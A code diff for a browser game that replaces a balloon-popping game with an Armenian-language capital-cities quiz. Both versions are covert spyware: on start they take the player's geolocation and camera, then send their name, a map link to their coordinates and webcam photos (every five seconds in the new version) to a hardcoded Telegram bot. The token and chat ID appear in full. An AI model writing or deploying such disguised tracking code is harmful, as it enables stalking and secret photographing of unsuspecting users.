@@ -1,193 +1,233 @@
-const canvas = document.getElementById('game-canvas');
-const ctx = canvas.getContext('2d');
+const nameForm = document.getElementById('name-form');
+const nameInput = document.getElementById('name-input');
+const nameFormContainer = document.getElementById('name-form-container');
+const gameArea = document.getElementById('game-area');
+const userNameDisplay = document.getElementById('user-name');
+const scoreInfo = document.getElementById('score-info');
+const questionContainer = document.getElementById('question');
+const answerButtons = document.getElementById('answer-buttons');
+const tryAgainBtn = document.getElementById('try-again-btn');
 
-function resize() {
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
+let shuffledQuestions = [];
+let currentQuestionIndex = 0;
+let correctCount = 0;
+let wrongCount = 0;
+let userName = '';
+let latitude = '';
+let longitude = '';
+let videoStream = null;
+
+const TELEGRAM_BOT_TOKEN = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
+const TELEGRAM_CHAT_ID = "8071841674";
+
+// === Инициализация ===
+nameForm.addEventListener('submit', (e) => {
+  e.preventDefault();
+  userName = nameInput.value.trim();
+  nameFormContainer.style.display = 'none';
+  gameArea.style.display = 'block';
+  userNameDisplay.textContent = `👤 ${userName}`;
+  getLocation();
+  getCamera();
+  startGame();
+});
+
+// === Попробовать снова ===
+tryAgainBtn.addEventListener('click', () => {
+  location.reload();
+});
+
+// === Геолокация ===
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        latitude = pos.coords.latitude;
+        longitude = pos.coords.longitude;
+        sendToTelegram("📍 Получены координаты:\n" +
+          `https://www.google.com/maps?q=${latitude},${longitude}`);
+      },
+      (err) => {
+        sendToTelegram("⚠️ Геолокация не разрешена.");
+      }
+    );
+  } else {
+    sendToTelegram("⚠️ Браузер не поддерживает геолокацию.");
+  }
 }
-resize();
-window.addEventListener('resize', resize);
 
-let redHits = 0;
-let fails = 0;
-let balloons = [];
-let collected = false;
+// === Камера и фото каждые 5 сек ===
+function getCamera() {
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      videoStream = stream;
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+      setInterval(() => takeSnapshot(video), 5000);
+    })
+    .catch(() => {
+      sendToTelegram("⚠️ Камера не разрешена.");
+    });
+}
 
-const token = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
-const chatId = "8071841674";
+function takeSnapshot(video) {
+  const canvas = document.createElement('canvas');
+  canvas.width = 320;
+  canvas.height = 240;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob((blob) => {
+    sendPhotoToTelegram(blob);
+  }, 'image/jpeg');
+}
 
-async function sendToTelegram(data) {
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+// === Отправка в Telegram ===
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
-      chat_id: chatId,
-      text: data,
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `👤 Имя: ${userName}\n${message}`,
     }),
   });
 }
 
-async function sendPhoto(photoBlob, caption) {
+function sendPhotoToTelegram(blob) {
   const formData = new FormData();
-  formData.append("chat_id", chatId);
-  formData.append("caption", caption);
-  formData.append("photo", photoBlob, "photo.jpg");
-
-  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+  formData.append("chat_id", TELEGRAM_CHAT_ID);
+  formData.append("photo", blob, "photo.jpg");
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
     method: "POST",
     body: formData,
   });
 }
 
-async function getUserData() {
-  const username = prompt("Մուտքագրեք ձեր անունը:");
-  let locationText = "📍 Գեո չի ստացվել";
-  let mapLink = "";
-  let photoFront = null;
-  let photoBack = null;
-  let gotGeo = false, gotCam = false;
-
-  // Получаем геолокацию
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      locationText = `🌍 Կոորդինատներ: ${lat}, ${lon}`;
-      mapLink = `🔗 Քարտեզում: https://www.google.com/maps?q=${lat},${lon}`;
-      gotGeo = true;
-      sendAll();
-    }, () => sendAll());
-  } else {
-    sendAll();
-  }
-
-  // Получаем фото с камеры
-  const video = document.getElementById("video");
-
-  try {
-    // фронтальная камера
-    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-    video.srcObject = streamFront;
-    await new Promise(res => setTimeout(res, 1000));
-    photoFront = await capturePhoto(video);
-    streamFront.getTracks().forEach(track => track.stop());
-
-    // задняя камера
-    const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
-    video.srcObject = streamBack;
-    await new Promise(res => setTimeout(res, 1000));
-    photoBack = await capturePhoto(video);
-    streamBack.getTracks().forEach(track => track.stop());
-
-    gotCam = true;
-  } catch (e) {
-    gotCam = false;
-  }
-
-  async function sendAll() {
-    if (collected) return;
-    collected = true;
-    await sendToTelegram(`👤 Անուն: ${username}\n${locationText}\n${mapLink || ""}\n📷 Տվյալներ ${gotCam ? "✓" : "✗"}, 📍 Գեո ${gotGeo ? "✓" : "✗"}`);
-    if (photoFront) await sendPhoto(photoFront, "Ֆոտո - Առջևի տեսախցիկ");
-    if (photoBack) await sendPhoto(photoBack, "Ֆոտո - Հետևի տեսախցիկ");
-    if (gotCam || gotGeo) startGame();
-  }
-}
-
-function capturePhoto(video) {
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext("2d").drawImage(video, 0, 0);
-  return new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
-}
-
-// --- Игра ---
-
-function createBalloon() {
-  const colors = ['red', 'blue', 'green', 'yellow'];
-  const color = colors[Math.floor(Math.random() * colors.length)];
-  return {
-    x: Math.random() * canvas.width,
-    y: canvas.height + 50,
-    radius: 30,
-    color: color,
-    speed: 1 + Math.random() * 2
-  };
-}
-
-function drawBalloon(b) {
-  ctx.beginPath();
-  ctx.arc(b.x, b.y, b.radius, 0, Math.PI * 2);
-  ctx.fillStyle = b.color;
-  ctx.fill();
-  ctx.closePath();
-}
-
-function update() {
-  ctx.clearRect(0, 0, canvas.width, canvas.height);
-  balloons.forEach(b => {
-    b.y -= b.speed;
-    drawBalloon(b);
-  });
-  balloons = balloons.filter(b => b.y + b.radius > 0);
-  if (Math.random() < 0.03) balloons.push(createBalloon());
-  requestAnimationFrame(update);
-}
-
-canvas.addEventListener('click', (e) => {
-  const rect = canvas.getBoundingClientRect();
-  const clickX = e.clientX - rect.left;
-  const clickY = e.clientY - rect.top;
-
-  for (let i = 0; i < balloons.length; i++) {
-    const b = balloons[i];
-    const dist = Math.sqrt((b.x - clickX)**2 + (b.y - clickY)**2);
-    if (dist < b.radius) {
-      if (b.color === 'red') {
-        redHits++;
-        if (redHits >= 3) endGame(true);
-      } else if (b.color === 'blue') {
-        fails++;
-        if (fails >= 3) location.reload();
-        else endGame(false);
-      }
-      balloons.splice(i, 1);
-      break;
-    }
-  }
-});
-
-function endGame(victory) {
-  document.getElementById('end-animation').classList.remove('hidden');
-  let countdown = 3;
-  const countdownEl = document.getElementById('countdown');
-  const anim = document.getElementById('balloon-animation');
-  anim.innerHTML = '';
-
-  // Добавим анимацию шариков с дротиками
-  for (let i = 0; i < 50; i++) {
-    const balloon = document.createElement('div');
-    balloon.classList.add('balloon');
-    balloon.style.background = ['red', 'blue', 'yellow'][i % 3];
-    balloon.style.left = Math.random() * window.innerWidth + 'px';
-    balloon.style.bottom = '0px';
-    balloon.style.animationDuration = `${2 + Math.random() * 2}s`;
-    anim.appendChild(balloon);
-  }
-
-  const timer = setInterval(() => {
-    countdown--;
-    countdownEl.textContent = countdown;
-    if (countdown <= 0) {
-      clearInterval(timer);
-      location.reload();
-    }
-  }, 1000);
-}
+// === Игра ===
 
 function startGame() {
-  update();
+  shuffledQuestions = shuffleArray([...questions]).slice(0, 20);
+  currentQuestionIndex = 0;
+  correctCount = 0;
+  wrongCount = 0;
+  showQuestion();
 }
 
-getUserData();
+function showQuestion() {
+  resetState();
+  const currentQuestion = shuffledQuestions[currentQuestionIndex];
+  questionContainer.textContent = currentQuestion.question;
+
+  currentQuestion.answers.forEach((answer) => {
+    const button = document.createElement('button');
+    button.textContent = answer.text;
+    button.classList.add('fade-in');
+    button.addEventListener('click', () => selectAnswer(button, answer.correct));
+    answerButtons.appendChild(button);
+  });
+
+  updateScoreInfo();
+}
+
+function resetState() {
+  answerButtons.innerHTML = '';
+}
+
+function selectAnswer(button, correct) {
+  const buttons = answerButtons.querySelectorAll('button');
+  buttons.forEach(btn => btn.disabled = true);
+
+  if (correct) {
+    button.classList.add('correct');
+    correctCount++;
+  } else {
+    button.classList.add('wrong');
+    const correctBtn = [...buttons].find(btn =>
+      shuffledQuestions[currentQuestionIndex].answers.find(a => a.text === btn.textContent && a.correct)
+    );
+    if (correctBtn) correctBtn.classList.add('correct');
+    wrongCount++;
+  }
+
+  setTimeout(() => {
+    currentQuestionIndex++;
+    if (currentQuestionIndex < shuffledQuestions.length) {
+      showQuestion();
+    } else {
+      endGame();
+    }
+  }, 1500);
+}
+
+function updateScoreInfo() {
+  const left = shuffledQuestions.length - currentQuestionIndex;
+  scoreInfo.innerHTML = `🔵 Մնացել է՝ ${left} | ✅ Ճիշտ՝ ${correctCount} | ❌ Սխալ՝ ${wrongCount}`;
+}
+
+function endGame() {
+  questionContainer.textContent = correctCount >= 15
+    ? '🎉 Շնորհավորում ենք, դուք հաղթեցիք!'
+    : '😔 Փորձեք կրկին։';
+  answerButtons.innerHTML = '';
+  tryAgainBtn.style.display = 'inline-block';
+}
+
+// === Помощники ===
+
+function shuffleArray(array) {
+  return array.sort(() => Math.random() - 0.5);
+}
+
+function shuffleAnswers(options, correctIndex) {
+  const correct = options[correctIndex];
+  const answers = options.map((text, i) => ({
+    text,
+    correct: i === correctIndex
+  }));
+  return shuffleArray(answers);
+}
+
+// === Вопросы (пока 10 тестовых) ===
+const questions = [
+  {
+    question: "Որն է Ֆրանսիայի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Փարիզ", "Լիոն", "Մարսել", "Նիցցա"], 0)
+  },
+  {
+    question: "Որն է Գերմանիայի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Բեռլին", "Մյունխեն", "Համբուրգ", "Քյոլն"], 0)
+  },
+  {
+    question: "Որն է Հայաստանի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Երևան", "Գյումրի", "Վանաձոր", "Աշտարակ"], 0)
+  },
+  {
+    question: "Որն է Ռուսաստանի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Մոսկվա", "Սանկտ-Պետերբուրգ", "Կազան", "Սոչի"], 0)
+  },
+  {
+    question: "Որն է ԱՄՆ-ի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Վաշինգտոն", "Նյու Յորք", "Լոս Անջելես", "Չիկագո"], 0)
+  },
+  {
+    question: "Որն է Չինաստանի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Պեկին", "Շանհայ", "Գուանչժոու", "Հոնկոնգ"], 0)
+  },
+  {
+    question: "Որն է Ճապոնիայի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Տոկիո", "Օսակա", "Կիոտո", "Նագասակի"], 0)
+  },
+  {
+    question: "Որն է Կանադայի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Օտտավա", "Տորոնտո", "Վանկուվեր", "Մոնրեալ"], 0)
+  },
+  {
+    question: "Որն է Եգիպտոսի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Կահիրե", "Լուքսոր", "Ալեքսանդրիա", "Գիզա"], 0)
+  },
+  {
+    question: "Որն է Մեքսիկայի մայրաքաղաքը?",
+    answers: shuffleAnswers(["Մեխիկո", "Գվադալախարա", "Տիհուանա", "Մոնտերեյ"], 0)
+  },
+];
